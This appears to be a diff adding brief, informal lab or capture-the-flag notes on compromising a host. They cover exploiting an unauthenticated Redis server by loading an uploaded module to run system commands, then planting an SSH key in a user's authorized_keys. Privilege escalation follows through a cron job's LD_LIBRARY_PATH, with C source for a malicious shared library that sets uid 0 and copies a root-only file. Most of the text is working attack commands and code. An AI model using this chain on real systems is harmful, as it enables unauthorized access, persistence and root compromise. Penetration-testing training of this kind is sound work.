@@ -1,0 +1,35 @@
+redis login didnot need auth .. so try everything
+
+nothing worked .. so at last  did module load
+
+`https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis`
+
+dwld the module ... compile it and now we had ftp open and the path it is uplaoed is
+
+```
+module load /var/ftp/pub/module.so
+ system.exec "whoami;id;hostname;uname -a"   ##runs
+ mkdir a direc too if not
+ system.exec 'echo "ssh-rsa <<id_rsa.pub>> > /home/pablo/.ssh/authorized_keys'
+```
+
+in crontab we see
+
+`LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils`
+
+so we can make a library and name it utils   like      `mv libcustom.so utils.so`
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+
+void _init(){
+
+    setuid(0);
+    setgid(0);
+    system("cat /root/proof.txt > /home/pablo/proof.txt");
+}
+```
+
+`gcc -shared -o libcustom.so -nostartfiles -fPIC a.c`
